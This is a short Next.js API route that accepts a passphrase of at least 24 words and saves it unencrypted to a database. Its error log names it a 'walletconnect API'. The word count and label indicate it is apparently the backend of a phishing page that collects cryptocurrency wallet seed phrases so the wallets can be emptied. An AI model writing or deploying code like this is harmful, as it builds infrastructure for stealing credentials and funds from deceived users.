import { NextRequest, NextResponse } from 'next/server';
import  prisma  from '@/lib/prisma';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { passphrase } = body;

    // 1. Validate input
    if (typeof passphrase !== 'string' || !passphrase.trim()) {
      return NextResponse.json(
        { error: 'Passphrase must be a non-empty string' },
        { status: 400 }
      );
    }

    const trimmed = passphrase.trim();
    const words = trimmed.split(/\s+/).filter(Boolean);
    const wordCount = words.length;

    // 2. Business rule validation
    if (wordCount < 24) {
      return NextResponse.json(
        {
          error: `Passphrase must be at least 24 words`,
          received: wordCount,
        },
        { status: 400 }
      );
    }

    // 3. Save to database
    const saved = await prisma.passphrase.create({
      data: {
        phrase: trimmed,
      },
    });

    // 4. Success response
    return NextResponse.json(
      {
        message: 'Passphrase stored successfully',
        id: saved.id,
      },
      { status: 201 }
    );
  } catch (error) {
    console.error('walletconnect API error:', error);

    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}